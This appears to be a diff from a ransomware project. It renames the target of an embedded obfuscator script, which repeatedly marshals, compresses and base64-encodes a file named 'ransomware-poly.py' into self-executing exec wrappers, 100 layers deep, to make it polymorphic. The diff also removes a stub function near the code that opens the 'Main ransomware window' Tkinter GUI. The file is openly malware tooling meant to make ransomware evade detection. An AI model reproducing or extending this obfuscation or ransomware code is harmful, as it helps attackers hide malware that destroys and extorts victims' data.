@@ -143,13 +143,13 @@ def encode(source:str) -> str:
         return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))'.format(binascii.b2a_base64(marshal_encoded))
     return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))'.format(selected_mode.__name__, selected_mode.compress(marshal_encoded))
 if __name__ == '__main__':
-    with open('ransomware-test.py') as inp:
+    with open('ransomware-poly.py') as inp:
         for i in range(100):
             if i == 0:
                 encoded = encode(source=inp.read())
             else:
                 encoded = encode(source=encoded)
-    with open('ransomware-test.py', 'w') as output:
+    with open('ransomware-poly.py', 'w') as output:
         output.write(encoded)"""
 
 with open(FUSCATE_DIR, "w") as f:
@@ -164,8 +164,6 @@ res = """
  |   /|_ \__ \| |\__ \ | |  |_ | .` | (__ | | / _ \ 
   |_|_|___|___|___|___/ |_| |___|_|\_|\___|___/_/ \_\ """
 
-def nothing():
-    pass
 
 # Main ransomware window
 root = tk.Tk()
